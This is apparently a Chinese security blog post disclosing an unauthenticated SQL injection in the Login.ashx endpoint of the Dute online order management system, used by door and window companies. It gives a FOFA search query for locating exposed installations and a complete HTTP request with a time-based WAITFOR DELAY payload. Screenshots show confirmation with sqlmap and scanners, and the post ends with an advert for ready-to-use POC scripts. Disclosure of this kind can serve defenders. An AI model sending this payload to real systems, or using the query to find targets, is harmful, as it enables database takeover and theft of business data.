#  杜特网上订单管理系统 Login.ashx SQL注入漏洞   
Superhero  nday POC   2025-01-05 15:12  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
杜特网上订单管理系统是一款专为门窗行业设计的高效订单管理工具，是佛山市杜特软件科技有限公司基于多年门窗行业管理软件研发经验，结合国内外先进管理理念，为门窗企业量身定制的一款订单管理系统。该系统旨在提高门窗企业的订单处理效率，优化业务流程，帮助企业实现精细化管理，提升整体竞争力。该系统适用于中大型门窗品牌、工厂以及门窗店等门窗相关企业，特别是那些需要优化订单处理流程、提升管理效率的企业。  
**01******  
  
**漏洞概述**  
  
  
由于杜特网上订单管理系统 Login.ashx 接口未对用户传入的参数进行合理的校验和过滤，导致传入的参数直接携带到数据库执行，导致SQL注入漏洞，未经身份验证的攻击者可通过此漏洞获取数据库权限，深入利用可获取服务器权限。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
app="TUTORSOFT-ERP"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXfia1t5CTVGw4MicO0QnERvzy8aVCzxEZ8Vzv3hibYKsq5R9XIAyfcWhUw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /ajax/Login.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

LoginCode=1';WAITFOR+DELAY+'0:0:8'--&Password=1&ckRemember=0
```  
  
延时8秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXAeaA1lZ1F6hkRrORNmxXLRw2HKXEyRBIc6qpjk0sDVXg8uJhJdt95w/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXc0tU5G9d8PQkOS5OzianckayY5EiapbXfI75CR9E8IUMullXicBewHrbg/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXyyREbEMeplMibNZEZDYGhfMJavicjscNBuurEAq9Gob3gf4qU7kCxcyw/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXFjfiacJ0e0jQEfB3WFcpIeakl3LxaPx6SYD9pkibsaCEPSO8tTJjeKibQ/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXLaACH4LXjFARI3uCeYm35kDbod8N1XTrVhs6xP6jB0rEA0asD5QMicg/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、  
对用户传入的参数进行限制  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10个左右POC。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
